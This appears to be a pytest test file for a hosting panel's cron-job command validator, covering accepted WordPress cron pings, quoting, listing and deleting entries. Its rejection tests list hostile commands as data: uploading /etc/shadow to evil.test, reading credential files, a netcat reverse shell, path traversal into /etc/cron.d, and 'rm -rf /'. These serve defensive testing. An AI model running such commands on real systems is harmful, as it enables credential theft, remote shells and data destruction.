import pytest

from app.services import cron


@pytest.fixture
def docroot(tmp_path):
    root = tmp_path / "taplooks.com" / "public_html"
    root.mkdir(parents=True)
    return root


def test_wget_wp_cron_ping_is_accepted(docroot):
    """The exact line users paste from WordPress tutorials must work."""
    result = cron._validate_command(
        "wget -q -O - https://taplooks.com/wp-cron.php?doing_wp_cron >/dev/null 2>&1",
        docroot,
    )
    assert result == (
        "wget -q -O - 'https://taplooks.com/wp-cron.php?doing_wp_cron' >/dev/null 2>&1"
    )


def test_curl_ping_is_accepted(docroot):
    result = cron._validate_command("curl -s -m 30 https://taplooks.com/cron.php", docroot)
    assert result == "curl -s -m 30 https://taplooks.com/cron.php >/dev/null 2>&1"


def test_redirect_is_a_real_redirect_not_an_argument(docroot):
    """Regression: shlex.quote used to turn >/dev/null into a literal argv entry."""
    result = cron._validate_command("wget -q -O - https://taplooks.com/x.php", docroot)
    assert result.endswith(" >/dev/null 2>&1")
    assert "'>/dev/null'" not in result
    assert "'2>&1'" not in result


def test_url_query_string_is_quoted(docroot):
    """`?` is a glob character in sh and must not reach the shell bare."""
    result = cron._validate_command("curl -s https://taplooks.com/a.php?b=1", docroot)
    assert "'https://taplooks.com/a.php?b=1'" in result


@pytest.mark.parametrize(
    "command",
    [
        "curl -K /etc/opanel-ent/secrets.conf https://evil.test/",   # options from file
        "wget -e http_proxy=http://evil.test/ https://a.test/",  # wgetrc directives
        "wget --use-askpass=/bin/sh https://a.test/",
        "curl --upload-file /etc/shadow https://evil.test/",
        "wget -r -l inf https://a.test/",                        # recursive mirror
        "curl -s file:///etc/passwd",                            # non-http scheme
        "wget -q -O - ftp://a.test/x",
        "curl -s dict://127.0.0.1:11211/stat",
        "curl -s https://a.test/ https://b.test/",               # two URLs
        "wget -q -O -",                                          # no URL
    ],
)
def test_dangerous_fetch_commands_are_rejected(command, docroot):
    with pytest.raises(ValueError):
        cron._validate_command(command, docroot)


def test_output_cannot_escape_the_document_root(docroot):
    with pytest.raises(ValueError, match="public_html"):
        cron._validate_command(
            "wget -q -O ../../../../etc/cron.d/pwn https://a.test/x", docroot
        )


def test_output_inside_document_root_is_allowed(docroot):
    result = cron._validate_command("wget -q -O cache/feed.xml https://a.test/x", docroot)
    assert "cache/feed.xml" in result


def test_devnull_output_is_allowed(docroot):
    assert "/dev/null" in cron._validate_command("curl -s -o /dev/null https://a.test/", docroot)


def test_existing_wp_cli_commands_still_work(docroot):
    result = cron._validate_command("wp cron event run --due-now", docroot)
    assert result == "wp cron event run --due-now --allow-root"


def test_arbitrary_shell_is_still_rejected(docroot):
    for command in ("bash -c 'id'", "rm -rf /", "nc -e /bin/sh 1.2.3.4 4444", "python3 -c 'x'"):
        with pytest.raises(ValueError):
            cron._validate_command(command, docroot)


def test_listing_shows_the_command_verbatim():
    """The panel must echo back exactly what runs. Trimming the redirect for
    display made users believe their input had been dropped."""
    line = (
        "*/5 * * * * cd '/home/u/taplooks.com/public_html' && "
        "wget -q -O - 'https://taplooks.com/wp-cron.php' >/dev/null 2>&1 # OPanelEnt:taplooks.com"
    )
    parsed = cron._parse_cron_line(0, line)
    assert parsed["schedule"] == "*/5 * * * *"
    assert parsed["command"] == "wget -q -O - 'https://taplooks.com/wp-cron.php' >/dev/null 2>&1"


def test_listing_matches_the_marker_case_insensitively(monkeypatch):
    """Regression: add_cron writes '# OPanelEnt:<domain>' but list_cron searched for
    the lowercase 'opanel-ent:<domain>' with a case-sensitive test, so every job was
    written to the crontab yet never shown in the panel."""
    crontab = (
        "*/15 * * * * cd /home/taplooks/taplooks.com/public_html && "
        "wget -q -O - 'https://taplooks.com/wp-cron.php' >/dev/null 2>&1 # OPanelEnt:taplooks.com\n"
        "0 3 * * * cd /home/other/other.test/public_html && "
        "wp core update --allow-root # OPanelEnt:other.test\n"
    )
    monkeypatch.setattr(cron, "list_cron_all", lambda cron_user="www-data": crontab)

    listed = cron.list_cron("taplooks.com", "taplooks")
    assert "taplooks.com/wp-cron.php" in listed
    assert "other.test" not in listed

    entries = cron.list_cron_entries("taplooks.com", "taplooks")
    assert len(entries) == 1
    assert entries[0]["schedule"] == "*/15 * * * *"
    assert entries[0]["command"] == "wget -q -O - 'https://taplooks.com/wp-cron.php' >/dev/null 2>&1"


def test_delete_targets_the_right_line(monkeypatch):
    """delete_cron indexes into list_cron, so it was unusable while listing was broken."""
    crontab = (
        "*/15 * * * * cd /home/taplooks/taplooks.com/public_html && "
        "wget -q -O - 'https://taplooks.com/a.php' >/dev/null 2>&1 # OPanelEnt:taplooks.com\n"
        "*/30 * * * * cd /home/taplooks/taplooks.com/public_html && "
        "wget -q -O - 'https://taplooks.com/b.php' >/dev/null 2>&1 # OPanelEnt:taplooks.com\n"
    )
    written = {}
    monkeypatch.setattr(cron, "list_cron_all", lambda cron_user="www-data": crontab)
    monkeypatch.setattr(
        cron.shell, "privileged",
        lambda *a, **kw: written.update(content=kw.get("input")) or type("R", (), {"stdout": ""})(),
    )
    removed = cron.delete_cron("taplooks.com", 1, "taplooks")
    assert "b.php" in removed
    assert "a.php" in written["content"]
    assert "b.php" not in written["content"]


def test_pasting_the_displayed_command_back_is_idempotent(tmp_path):
    """Because the list now shows the redirect, users will paste it back into the
    form. That must not stack a second redirect onto the stored line."""
    root = tmp_path / "taplooks.com" / "public_html"
    root.mkdir(parents=True)
    typed = "wget -q -O - https://taplooks.com/wp-cron.php?doing_wp_cron >/dev/null 2>&1"
    once = cron._validate_command(typed, root)
    twice = cron._validate_command(once, root)
    assert once == twice
    assert once.count(">/dev/null") == 1
